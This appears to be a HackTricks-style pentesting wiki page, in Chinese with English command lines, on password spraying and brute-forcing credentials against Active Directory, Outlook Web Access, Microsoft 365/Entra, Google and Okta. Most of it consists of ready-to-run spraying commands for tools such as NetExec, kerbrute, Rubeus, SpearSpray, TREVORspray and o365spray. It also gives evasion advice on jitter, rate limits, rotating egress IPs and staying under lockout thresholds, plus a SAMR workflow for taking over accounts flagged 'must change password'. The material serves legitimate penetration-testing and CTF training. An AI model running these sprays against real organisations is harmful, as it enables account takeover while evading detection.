# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

找到多个**有效用户名**后，可以使用**最常见的密码**（请牢记环境的密码策略）逐一尝试已发现的用户。\
**默认情况下**，**密码**的**最小** **长度**为 **7**。

常见用户名列表也可能很有用：[https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

请注意，如果尝试多个错误密码，**可能会锁定某些账户**（默认情况下，超过 10 次）。

### 获取密码策略

如果你拥有某些用户凭据，或者有一个域用户的 shell，可以**通过以下方式获取密码策略**：
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### 从 Linux（或全部）进行利用

- 使用 **crackmapexec：**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- 使用 **NetExec (CME successor)** 针对 SMB/WinRM 执行定向、低噪声 spraying：
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- 使用 [**kerbrute**](https://github.com/ropnop/kerbrute)（Go）
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**（你可以指定尝试次数以避免账户锁定）：**_<sup>[[3]](#references)</sup>
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- 使用 [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - **不推荐，有时无法正常工作**<sup>[[2]](#references)</sup>
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- 使用 **Metasploit** 的 `scanner/smb/smb_login` module：

![Password Spraying - Brute-Force：使用 Metasploit 的 scanner/smb/smb login module](<../../images/image (745).png>)

- 使用 **rpcclient**：<sup>[[6]](#references)</sup>
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### 从 Windows

- 使用带有 brute 模块的 [Rubeus](https://github.com/Zer1t0/Rubeus) 版本：
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- 使用 [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)（默认情况下，它可以从域中生成用户，并获取域的 password policy，依据该策略限制尝试次数）：<sup>[[4]](#references)</sup>
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- 使用 [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### 识别并接管“下次登录时必须更改密码”的账户（SAMR）

一种低噪声 technique 是喷洒一个无害/空密码，并捕获返回 STATUS_PASSWORD_MUST_CHANGE 的账户，这表示密码已被强制过期，且无需知道旧密码即可更改密码。<sup>[[9]](#references)[[10]](#references)</sup>

工作流程：
- 枚举用户（通过 SAMR 进行 RID brute）以构建目标列表：

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Spray 空密码，并在命中后继续执行，以捕获必须在下次登录时更改密码的账户：
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- 对于每个命中项，使用 NetExec 的 module 通过 SAMR 更改密码（设置了 "must change" 时不需要旧密码）：
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
操作说明：
- 在进行基于 Kerberos 的操作前，确保主机时钟与 DC 同步：`sudo ntpdate <dc_fqdn>`。
- 在某些模块（例如 RDP/WinRM）中，不带 `(Pwn3d!)` 的 `[+]` 表示凭据有效，但该账户缺少交互式登录权限。

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)

基于 Kerberos pre-auth 的 spraying 相较于 SMB/NTLM/LDAP bind 尝试能降低噪声，并且更符合 AD lockout policies。SpearSpray 将 LDAP 驱动的目标筛选、pattern engine 和 policy awareness（domain policy + PSOs + badPwdCount buffer）结合起来，从而更精确、更安全地执行 spraying。它还可以在 Neo4j 中标记已 compromised 的 principals，以便进行 BloodHound 路径分析。<sup>[[1]](#references)</sup>

Key ideas:
- 使用 paging 进行 LDAP user discovery，并支持 LDAPS；还可以选择使用自定义 LDAP filters。
- 基于 domain lockout policy + PSO-aware filtering，保留可配置的 attempt buffer（threshold），避免锁定用户。
- 使用 fast gssapi bindings 进行 Kerberos pre-auth validation（在 DCs 上生成 4768/4771，而不是 4625）。
- 基于 pattern 为每个用户生成 password，使用 names 和 temporal values 等变量；这些值根据每个用户的 pwdLastSet 派生。
- 通过 threads、jitter 和 max requests per second 控制吞吐量。
- 可选的 Neo4j integration，用于标记 BloodHound 的 owned users。

Basic usage and discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
目标定位与模式控制：
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
隐蔽性和安全控制：
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound 数据丰富：
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Pattern 系统概述（patterns.txt）：
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
可用变量包括：
- {name}, {samaccountname}
- 来自每个用户 pwdLastSet（或 whenCreated）的时间信息：{year}, {short_year}, {month_number}, {month_en}, {season_en}
- 组合辅助变量和组织标记：{separator}, {suffix}, {extra}

操作说明：

- 优先使用 -dc 查询 PDC-emulator，以读取最权威的 badPwdCount 和策略相关信息。
- badPwdCount 会在观察窗口结束后的下一次尝试时触发重置；使用阈值和时间间隔来确保安全。
- Kerberos pre-auth 尝试会在 DC 遥测中显示为 4768/4771；使用抖动和速率限制来降低可识别性。

> 提示：SpearSpray 的默认 LDAP page size 为 200；根据需要使用 -lps 进行调整。

## Outlook Web Access

有多种工具可以进行 **password spraying outlook**。

- 使用 [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- 使用 [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- 使用 [Ruler](https://github.com/sensepost/ruler)（可靠！）<sup>[[5]](#references)</sup>
- 使用 [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)（Powershell）
- 使用 [MailSniper](https://github.com/dafthack/MailSniper)（Powershell）

要使用这些工具中的任意一个，你需要用户列表以及一个密码或一小组用于 spraying 的密码。
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Microsoft 365 / Entra ID

对于 cloud spraying，首先确定 tenant 属于 **managed**、**federated** 还是 **hybrid**，因为 endpoint 和 lockout 行为可能与本地 AD 不同。在 Microsoft Entra 中，**Smart Lockout** 会改变重复猜测消耗 lockout budget 的方式：<sup>[[7]](#references)</sup>

- 重复使用**相同的错误密码**不会持续增加 lockout counter，但尝试**新的候选密码**会增加。
- **熟悉**和**不熟悉**的位置拥有**独立的** counter。
- 使用 **pass-through authentication (PTA)** 的 tenant 无法从错误密码 hash tracking 中受益，因此应将其视为更接近经典的、对 lockout 敏感的目标。

实践中，每轮 **spray 一个密码**，在各轮之间保持足够的间隔，并优先使用能够在发送猜测前发现 tenant 实际 auth flow 的工具。

- 使用 [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray)，可以对 tenant 执行 recon，发现 `token_endpoint`，对 `msol`/`adfs`/`owa`/`okta` 执行 spray，并通过多个 egress IP 轮换流量：
```bash
# Enumerate tenant info, autodiscover, and the token endpoint
trevorspray --recon corp.com

# Spray against the discovered token endpoint with delay/jitter
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--delay 5 --jitter 3 --lockout-delay 60

# Round-robin between multiple SSH egress points
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--ssh root@1.2.3.4 root@4.3.2.1 --delay 5
```
- 使用 [**Spray365**](https://github.com/MarkoH17/Spray365)，你可以预先构建可恢复的**执行计划**、随机化认证顺序，并强制设置每个用户的**最小延迟**，以避开锁定窗口：
```bash
# Generate a plan with shuffled auth order and a per-user minimum delay
python3 spray365.py generate normal -ep plan.s365 -d corp.com \
-u users.txt -pf passwords.txt --delay 30 -mD 1800 \
-S -rUA

# Execute the plan and abort after observing several lockouts
python3 spray365.py spray -ep plan.s365 -l 5
```
- 使用 [**o365spray**](https://github.com/0xZDH/o365spray)，你可以验证租户，使用 `onedrive` 等模块枚举用户，并通过 `oauth2` 或 `adfs` 执行 spray，同时在每个锁定窗口内确保**每个用户仅尝试一次**。如果你已经有 FireProx API，可以通过 `--proxy-url` 传入，以分散源 IP：
```bash
o365spray --validate --domain corp.com
o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
```
近期的 operator tradecraft 也转向了 **distributed cloud spraying**。[**TeamFiltration**](https://github.com/Flangvik/TeamFiltration) 支持 time windows、password shuffling、ADFS/M365 spraying，以及自动化 post-auth exfiltration。近期现实世界中的滥用活动还利用 **Microsoft Teams API** 进行 account enumeration，并通过 **AWS region rotation** 将 spray waves 分散到多个 source geographies。<sup>[[8]](#references)</sup>

## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## 参考文献

- [1] [SpearSpray – Enhance Your Active Directory Password Spraying with User Intelligence](https://github.com/sikumy/spearspray)
- [2] [TarlogicSecurity/kerbrute – Kerberos bruteforcing with Impacket (Python)](https://github.com/TarlogicSecurity/kerbrute)
- [3] [Spray – A Password Spraying tool for Active Directory Credentials](https://github.com/Greenwolf/Spray)
- [4] [Active Directory Password Spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [5] [Password Spraying Outlook Web Access: Remote Shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [6] [Password Spraying & Other Fun with RPCCLIENT](https://www.blackhillsinfosec.com/?p=5296)
- [7] [Microsoft Entra smart lockout](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
- [8] [Proofpoint: Attackers Unleash TeamFiltration: Account Takeover Campaign](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
- [9] [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [10] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)

{{#include ../../banners/hacktricks-training.md}}
